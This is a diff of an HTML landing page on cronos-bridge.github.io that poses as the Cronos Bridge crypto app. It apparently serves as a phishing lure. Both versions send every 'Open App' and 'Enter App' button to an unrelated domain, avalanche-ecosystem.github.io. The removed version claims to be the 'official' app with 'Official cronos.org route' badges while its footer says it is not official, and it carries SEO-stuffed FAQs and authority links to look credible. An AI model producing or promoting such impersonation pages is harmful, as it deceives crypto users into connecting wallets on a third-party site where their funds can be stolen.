@@ -1,47 +1,118 @@
 <!doctype html>
-<html lang="en"><head>
-<meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
-<title>cronos bridge - Open App</title><meta name="description" content="cronos bridge opens the official Cronos EVM Bridge app for CRO and supported IBC transfers to Cronos networks.">
-<meta name="robots" content="index,follow,max-image-preview:large">
-<link rel="canonical" href="https://cronos-bridge.github.io/"><meta name="theme-color" content="#FFFFFF">
-<meta property="og:type" content="website"><meta property="og:title" content="cronos bridge - Open App"><meta property="og:description" content="cronos bridge opens the official Cronos EVM Bridge app for CRO and supported IBC transfers to Cronos networks.">
-<meta property="og:url" content="https://cronos-bridge.github.io/"><meta property="og:image" content="https://cronos-bridge.github.io/og-cover.png"><meta property="og:locale" content="en">
-<meta name="twitter:card" content="summary_large_image"><meta name="twitter:title" content="cronos bridge - Open App"><meta name="twitter:description" content="cronos bridge opens the official Cronos EVM Bridge app for CRO and supported IBC transfers to Cronos networks."><meta name="twitter:image" content="https://cronos-bridge.github.io/og-cover.png">
-<link rel="icon" href="favicon.png" type="image/png"><link rel="manifest" href="site.webmanifest"><link rel="apple-touch-icon" href="static/icon-180.png">
-<link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600;700&display=swap">
-<link rel="stylesheet" href="static/style.css">
-<script type="application/ld+json">{"@context": "https://schema.org", "@graph": [{"@type": "WebSite", "@id": "https://cronos-bridge.github.io/#website", "url": "https://cronos-bridge.github.io/", "name": "Cronos Bridge"}, {"@type": "WebPage", "@id": "https://cronos-bridge.github.io/#webpage", "url": "https://cronos-bridge.github.io/", "name": "cronos bridge - Open App", "description": "cronos bridge opens the official Cronos EVM Bridge app for CRO and supported IBC transfers to Cronos networks.", "inLanguage": "en", "isPartOf": {"@id": "https://cronos-bridge.github.io/#website"}}, {"@type": "Organization", "@id": "https://cronos-bridge.github.io/#org", "name": "Cronos Bridge", "url": "https://cronos-bridge.github.io/", "logo": "https://cronos-bridge.github.io/og-cover.png", "sameAs": ["https://x.com/cronos_chain", "https://github.com/crypto-org-chain", "https://www.coingecko.com/en/coins/cronos", "https://defillama.com/chain/Cronos"]}, {"@type": "WebApplication", "@id": "https://cronos-bridge.github.io/#app", "name": "Cronos Bridge", "url": "https://cronos-bridge.github.io/", "applicationCategory": "FinanceApplication", "operatingSystem": "Web", "browserRequirements": "Requires JavaScript", "description": "cronos bridge opens the official Cronos EVM Bridge app for CRO and supported IBC transfers to Cronos networks.", "featureList": ["Official cronos.org route", "IBC-based protocol", "Network gas applies"], "isPartOf": {"@id": "https://cronos-bridge.github.io/#website"}}, {"@type": "FAQPage", "@id": "https://cronos-bridge.github.io/#faq", "inLanguage": "en", "mainEntity": [{"@type": "Question", "name": "What is Cronos Bridge used for?", "acceptedAnswer": {"@type": "Answer", "text": "Cronos Bridge is used to move supported assets into and out of the Cronos ecosystem so users can access Cronos EVM apps, DeFi, NFTs, and transfers. The official bridge route list is the source to check for supported routes before signing."}}, {"@type": "Question", "name": "Do I need CRO after using Cronos Bridge?", "acceptedAnswer": {"@type": "Answer", "text": "Yes, users generally need CRO to pay gas for transactions on Cronos EVM. CoinMarketCap CRO profile identifies CRO as the gas token across Cronos chains, so keep a small gas balance after bridging."}}, {"@type": "Question", "name": "Can I bridge from Ethereum to Cronos?", "acceptedAnswer": {"@type": "Answer", "text": "Cronos ecosystem routes can include Ethereum-facing transfers, but availability depends on the official bridge interface and current supported assets. Binance Academy bridge explainer is useful background for how bridge routes connect separate chains."}}, {"@type": "Question", "name": "Why does my Cronos address look like Ethereum?", "acceptedAnswer": {"@type": "Answer", "text": "Cronos EVM uses Ethereum-style 0x addresses because it is EVM-compatible. ethereum.org EVM documentation explains the execution environment behind Ethereum-style smart-contract networks."}}, {"@type": "Question", "name": "Can I send CRO directly from Crypto.com to Cronos?", "acceptedAnswer": {"@type": "Answer", "text": "Many users fund Cronos through Crypto.com routes, but the exact withdrawal network label must match the destination you intend to use. Crypto.com Help Center transfer steps describe checking the route before confirming."}}, {"@type": "Question", "name": "How do I check a Cronos Bridge transfer?", "acceptedAnswer": {"@type": "Answer", "text": "Use the source-chain explorer for the sending transaction and Cronos Explorer for the destination address. Cronos Explorer is the destination-side source for reviewing Cronos account and transaction activity."}}]}]}</script>
-</head><body>
-<header class="site-header">
-  <a class="brand" href="#top" aria-label="Cronos Bridge"><img class="brand-mark" src="favicon.png" alt="" width="34" height="34"><span class="brand-name">Cronos Bridge</span></a>
-  <nav class="site-nav" aria-label="Primary"><ul class="nav-list"><li><a href="#about">About</a></li><li><a href="#facts">Overview</a></li><li><a href="#faq">FAQ</a></li></ul></nav>
-  <span class="header-spacer"></span>
-  <a class="btn btn-dark header-cta" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open App ↗</a>
-  <button class="nav-toggle" aria-label="Menu" aria-expanded="false"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M4 7h16M4 12h16M4 17h16"/></svg></button>
-</header>
-<main id="top">
-  <section class="hero">
-    <div class="hero-deco" aria-hidden="true"><span class="strip"></span><span class="d1"></span><span class="d2"></span><span class="d3"></span><span class="d4"></span><span class="d5"></span></div>
-    <div class="container">
-      <h1>Cronos Bridge</h1>
-      <div class="bridge-widget" role="group" aria-label="Cronos Bridge preview"><div class="bw-field"><span class="bw-coin mono">CRO</span><span class="bw-meta"><span class="bw-amount">0</span><span class="bw-sub"><b>CRO</b> · Cronos POS</span></span></div><button class="bw-switch" type="button" aria-label="Switch"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 9h13M17 9l-4-4M17 9l-4 4M20 15H7M7 15l4-4M7 15l4 4"/></svg></button><div class="bw-field"><span class="bw-coin mono">CRO</span><span class="bw-meta"><span class="bw-amount">0.0</span><span class="bw-sub"><b>CRO</b> · Cronos EVM</span></span></div><a class="btn btn-dark bw-go" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open App ↗</a></div><div class="bw-netrow"><span class="nl">Networks</span><img src="static/net-ethereum.png" alt="Ethereum" loading="lazy"></div>
-      <div class="hero-go"><a class="btn btn-green" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open Cronos Bridge ↗</a></div>
-      <p class="hero-note">Live preview — open the official Cronos Bridge app from your own wallet.</p>
-      <div class="trust-row"><span class="trust-chip">Official cronos.org route</span><span class="trust-chip">IBC-based protocol</span><span class="trust-chip">Network gas applies</span></div>
-    </div>
-  </section>
-  <section class="section" id="about"><div class="container"><h2>What is Cronos Bridge?</h2><div class="capsule"><strong>Cronos Bridge</strong> is the official Cronos EVM Bridge web app for moving supported assets between Cronos POS, Cronos EVM, and selected Cosmos IBC networks; Cronos docs describe it as a decentralized protocol built on open-source <a class="inline-link" href="https://docs.cronos.org/for-users/bridge/other_chain" rel="noopener noreferrer">IBC bridge infrastructure</a>.</div></div></section>
-  <section class="section" id="facts"><div class="container"><h2>Cronos Bridge at a glance</h2><div class="facts"><div class="f"><small>Category</small><b>Cronos ecosystem bridge</b></div><div class="f"><small>Network</small><b>Cronos EVM</b></div><div class="f"><small>Token</small><b><a class="inline-link" href="https://www.coingecko.com/en/coins/cronos" rel="noopener noreferrer">CRO market profile</a></b></div><div class="f"><small>Compatibility</small><b><a class="inline-link" href="https://ethereum.org/developers/docs/evm/" rel="noopener noreferrer">EVM execution model</a></b></div><div class="f"><small>Explorer</small><b><a class="inline-link" href="https://explorer.cronos.com/" rel="noopener noreferrer">Cronos Explorer activity</a></b></div></div></div></section>
-  <section class="section section-alt"><div class="container"><h2>Cronos Bridge supported chains and assets</h2><div class="intent-a">Cronos Bridge routes are centered on moving assets into and out of the Cronos ecosystem, including Cronos EVM and related Crypto.org/Cronos infrastructure, with supported assets varying by route. Users commonly look for CRO, stablecoins, and major DeFi assets, but the live bridge UI is the source of truth because token lists and routes can change. The bridge guide lists <a class="inline-link" href="https://docs.cronos.org/for-users/bridge/faq" rel="noopener noreferrer">supported bridge blockchains and tokens</a>, while the Cronos ecosystem view on <a class="inline-link" href="https://defillama.com/chain/cronos" rel="noopener noreferrer">DeFiLlama chain data</a> helps users understand where bridged assets may be used after arrival. Always confirm the source chain, destination chain, and output token before signing.</div></div></section><section class="section"><div class="container"><h2>Cronos Bridge fees and CRO gas</h2><div class="intent-a">Cronos Bridge fees can include source-chain gas, destination-chain gas, and any bridge or relayer cost shown in the interface. CRO is the key gas asset for Cronos ecosystem transactions, so users should keep a small CRO balance after bridging; the <a class="inline-link" href="https://coinmarketcap.com/currencies/cronos/" rel="noopener noreferrer">CRO token profile</a> describes CRO as the native gas token across Cronos chains. The exact cost still depends on route, token, contract execution, and network conditions, so compare the wallet gas estimate with the bridge's received amount and the <a class="inline-link" href="https://cronoscan.com/" rel="noopener noreferrer">destination transaction record</a> before assuming a transfer is complete.</div></div></section><section class="section section-alt"><div class="container"><h2>Bridge CRO to Cronos EVM</h2><div class="intent-a">Bridging CRO to Cronos EVM is a common first step for users who want to use Cronos DeFi, NFTs, or on-chain apps; <a class="inline-link" href="https://defillama.com/chain/cronos" rel="noopener noreferrer">Cronos protocol listings</a> can help users see the broader on-chain environment without implying any specific return. The key is choosing the correct source network, because CRO can exist across exchange accounts, Crypto.org-style addresses, and Cronos EVM addresses. A wallet address format mismatch can cause confusion even when the asset is related. Use an official bridge or exchange withdrawal route that explicitly lists Cronos EVM, then verify the receiving address using the <a class="inline-link" href="https://www.coingecko.com/en/coins/cronos" rel="noopener noreferrer">Cronos asset reference</a> and the destination explorer.</div></div></section><section class="section"><div class="container"><h2>Cronos Bridge pending transaction</h2><div class="intent-a">A Cronos Bridge transaction can appear pending while the source transaction confirms, while a relayer processes the cross-chain message, or while the destination explorer indexes the result. The <a class="inline-link" href="https://cosmos.network/ibc/" rel="noopener noreferrer">Cosmos IBC overview</a> is useful background for why cross-chain transfers involve messages across separate networks. First check the source-chain transaction hash, then inspect the destination wallet. If the transaction succeeded but the wallet does not show the token, manually add the destination token contract. Avoid resubmitting until you know whether the original transfer failed, because <a class="inline-link" href="https://www.investopedia.com/what-are-cross-chain-bridges-6750848" rel="noopener noreferrer">cross-chain bridge mechanics</a> can create separate transactions rather than editing the first one.</div></div></section>
-  <section class="section"><div class="container"><h2>How to bridge Cronos Bridge</h2><ol class="steps"><li><b>Connect wallet</b><span>Open the official app, connect a supported wallet, and approve the prompt in the wallet interface; the <a class="inline-link" href="https://help.crypto.com/en/articles/5645017-cronos-bridge" rel="noopener noreferrer">Crypto.com Onchain bridge walkthrough</a> shows the same network-and-token selection pattern.</span></li><li><b>Choose route</b><span>Select the origin network, destination network, and asset; verify the active wallet network and recipient address.</span></li><li><b>Enter amount</b><span>Review the amount, displayed network fees, and destination details before continuing.</span></li><li><b>Confirm transfer</b><span>Sign the wallet request, then track the bridge status in the app history or linked explorer view.</span></li></ol><div class="cta-band"><div><p>Ready to bridge?</p><p class="sub">Open the official Cronos Bridge app and verify the domain before you sign.</p></div><a class="btn btn-green" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open Cronos Bridge ↗</a></div></div></section>
-  <section class="section section-alt"><div class="container"><h2>Fees, custody, and security checks</h2><div class="facts"><div class="f"><small>Fees</small><b><a class="inline-link" href="https://www.binance.com/en/academy/articles/what-are-blockchain-transaction-fees" rel="noopener noreferrer">blockchain fee mechanics</a></b><p>Compare displayed gas and received amounts before signing. On-chain actions are irreversible; this is not financial advice.</p></div><div class="f"><small>Custody</small><b><a class="inline-link" href="https://arxiv.org/abs/2210.16209" rel="noopener noreferrer">bridge component risk review</a></b><p>Self-custody means the wallet signature authorizes the action. On-chain actions are irreversible; this is not financial advice.</p></div><div class="f"><small>Security</small><b><a class="inline-link" href="https://www.wired.com/story/blockchain-network-bridge-hacks/" rel="noopener noreferrer">bridge attack history</a></b><p>Verify the domain, route, and recipient before approval. On-chain actions are irreversible; this is not financial advice.</p></div></div></div></section>
-  <section class="section"><div class="container"><h2>Cronos Bridge vs exchange withdrawal</h2><div class="intent-a">A bridge is usually relevant when funds are already in self-custody and the user signs the route directly, while an exchange withdrawal is a custodial workflow where the platform processes the network transfer. <a class="inline-link" href="https://www.investopedia.com/what-are-cross-chain-bridges-6750848" rel="noopener noreferrer">Cross-chain bridge definitions</a> explain the self-custody transfer model.</div><div class="cmp-wrap"><table class="cmp-table"><thead><tr><th>Dimension</th><th>Cronos Bridge</th><th>Exchange withdrawal</th></tr></thead><tbody><tr><td>Starting point</td><td>Self-custody wallet</td><td>Centralized exchange balance</td></tr><tr><td>Control</td><td>User signs bridge transactions</td><td>Exchange processes withdrawal</td></tr><tr><td>Key risk</td><td>Wrong route or token contract</td><td>Wrong network label or platform limits</td></tr><tr><td>Best for</td><td>On-chain users moving assets to Cronos</td><td>Users funding Cronos directly from an exchange</td></tr></tbody></table></div></div></section>
-  <section class="section section-alt" id="faq"><div class="container"><h2>Cronos Bridge FAQ</h2><div class="faq-list"><details open><summary><h3>What is Cronos Bridge used for?</h3></summary><div>Cronos Bridge is used to move supported assets into and out of the Cronos ecosystem so users can access Cronos EVM apps, DeFi, NFTs, and transfers. It is not a universal bridge for every token; check the <a class="inline-link" href="https://cronos.org/bridge" rel="noopener noreferrer">official bridge route list</a> before signing.</div></details><details><summary><h3>Do I need CRO after using Cronos Bridge?</h3></summary><div>Yes, users generally need CRO to pay gas for transactions on Cronos EVM. If you bridge only a token such as a stablecoin, you may still need CRO before you can swap, approve, or transfer it; the <a class="inline-link" href="https://coinmarketcap.com/currencies/cronos/" rel="noopener noreferrer">CoinMarketCap CRO profile</a> identifies CRO as the gas token across Cronos chains.</div></details><details><summary><h3>Can I bridge from Ethereum to Cronos?</h3></summary><div>Cronos ecosystem routes can include Ethereum-facing transfers, but availability depends on the official bridge interface and current supported assets. If Ethereum is the source, budget for Ethereum gas as well as any destination gas needs, and compare the route with the <a class="inline-link" href="https://www.binance.com/en/academy/articles/what-s-a-blockchain-bridge" rel="noopener noreferrer">Binance Academy bridge explainer</a>.</div></details><details><summary><h3>Why does my Cronos address look like Ethereum?</h3></summary><div>Cronos EVM uses Ethereum-style 0x addresses because it is EVM-compatible. That does not mean every Ethereum token or bridge route is automatically supported; the <a class="inline-link" href="https://ethereum.org/developers/docs/evm/" rel="noopener noreferrer">ethereum.org EVM documentation</a> explains the execution environment behind Ethereum-style smart-contract networks.</div></details><details><summary><h3>Can I send CRO directly from Crypto.com to Cronos?</h3></summary><div>Many users fund Cronos through Crypto.com routes, but the exact withdrawal network label must match the destination you intend to use. If you need Cronos EVM, select the Cronos-compatible withdrawal option and verify the address format against the <a class="inline-link" href="https://help.crypto.com/en/articles/5645017-cronos-bridge" rel="noopener noreferrer">Crypto.com Help Center transfer steps</a>.</div></details><details><summary><h3>How do I check a Cronos Bridge transfer?</h3></summary><div>Use the source-chain explorer for the sending transaction and <a class="inline-link" href="https://explorer.cronos.com/" rel="noopener noreferrer">Cronos Explorer</a> for the destination address. If the bridge transaction succeeded but the wallet balance is missing, add the token contract manually; if neither explorer shows progress, check the bridge status page or official support resources before retrying.</div></details></div></div></section>
-</main>
-<footer class="site-footer"><div class="container">
-  <p class="footer-note">Not the official app. Verify cronos.org before connecting a wallet. Educational content only; not financial advice.</p>
-  <p class="footer-meta"><a href="#top">Back to top ↑</a></p>
-</div></footer>
-<script src="static/app.js" defer></script>
-</body></html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Cronos Bridge</title>
+  <meta name="description" content="Cronos Bridge moves tokens between Ethereum and the Cronos chain from your own wallet.">
+  <link rel="canonical" href="https://cronos-bridge.github.io/">
+  <meta name="robots" content="index,follow,max-image-preview:large">
+  <meta name="theme-color" content="#F7F8FA">
+  <meta property="og:type" content="website">
+  <meta property="og:title" content="Cronos Bridge">
+  <meta property="og:description" content="Cronos Bridge moves tokens between Ethereum and the Cronos chain from your own wallet.">
+  <meta property="og:url" content="https://cronos-bridge.github.io/">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Cronos Bridge">
+  <meta name="twitter:description" content="Cronos Bridge moves tokens between Ethereum and the Cronos chain from your own wallet.">
+  <link rel="icon" type="image/png" href="favicon.png">
+  <link rel="apple-touch-icon" href="favicon.png">
+  <link rel="manifest" href="site.webmanifest">
+  <link rel="stylesheet" href="style.css">
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@graph": [
+      {
+        "@type": "WebSite",
+        "@id": "https://cronos-bridge.github.io/#website",
+        "url": "https://cronos-bridge.github.io/",
+        "name": "Cronos Bridge",
+        "inLanguage": "en"
+      },
+      {
+        "@type": "WebApplication",
+        "@id": "https://cronos-bridge.github.io/#app",
+        "name": "Cronos Bridge",
+        "applicationCategory": "FinanceApplication",
+        "operatingSystem": "Web",
+        "url": "https://cronos-bridge.github.io/"
+      },
+      {
+        "@type": "Organization",
+        "@id": "https://cronos-bridge.github.io/#organization",
+        "name": "Cronos",
+        "url": "https://cronos.org/",
+        "sameAs": [
+          "https://cronos.org/"
+        ]
+      }
+    ]
+  }
+  </script>
+</head>
+<body>
+  <header class="topbar">
+    <a class="brand" href="#" aria-label="Cronos Bridge home">
+      <img src="favicon.png" width="28" height="28" alt="">
+      <span>Cronos Bridge</span>
+    </a>
+    <nav class="nav" aria-label="Authority links">
+      <a href="https://cronoscan.com/" target="_blank" rel="nofollow noopener noreferrer">Cronoscan</a>
+      <a href="https://cronos.org/" target="_blank" rel="nofollow noopener noreferrer">Cronos</a>
+      <a href="https://ethereum.org/bridges/" target="_blank" rel="nofollow noopener noreferrer">Ethereum bridges</a>
+    </nav>
+    <span class="spacer"></span>
+    <a class="ghost" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Open app</a>
+  </header>
+
+  <main class="stage">
+    <section class="hero" aria-labelledby="page-title">
+      <h1 id="page-title">Cronos Bridge</h1>
+      <p class="sub"><strong>Cronos Bridge</strong> moves tokens between Ethereum and the Cronos chain from your own wallet.</p>
+    </section>
+
+    <section class="card" aria-label="Bridge route">
+      <div class="route">
+        <div class="leg">
+          <span class="label">From</span>
+          <span class="chip">
+            <img class="icon" src="eth.png" width="30" height="30" alt="Ethereum">
+            <span class="asset">Ethereum</span>
+          </span>
+        </div>
+        <button class="switch" type="button" data-switch aria-label="Switch direction">
+          <span aria-hidden="true">&#8594;</span>
+        </button>
+        <div class="leg">
+          <span class="label">To</span>
+          <span class="chip">
+            <img class="icon" src="cro.png" width="30" height="30" alt="Cronos">
+            <span class="asset">Cronos</span>
+          </span>
+        </div>
+      </div>
+      <a class="primary" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Enter App <span aria-hidden="true">&#8250;</span></a>
+    </section>
+  </main>
+
+  <footer class="foot">Cronos Bridge &mdash; 2026</footer>
+
+  <script>
+  (function () {
+    "use strict";
+    var button = document.querySelector("[data-switch]");
+    if (!button) return;
+
+    button.addEventListener("click", function () {
+      var chips = document.querySelectorAll(".leg .chip");
+      if (chips.length < 2) return;
+
+      var first = chips[0].innerHTML;
+      chips[0].innerHTML = chips[1].innerHTML;
+      chips[1].innerHTML = first;
+    });
+  }());
+  </script>
+</body>
+</html>
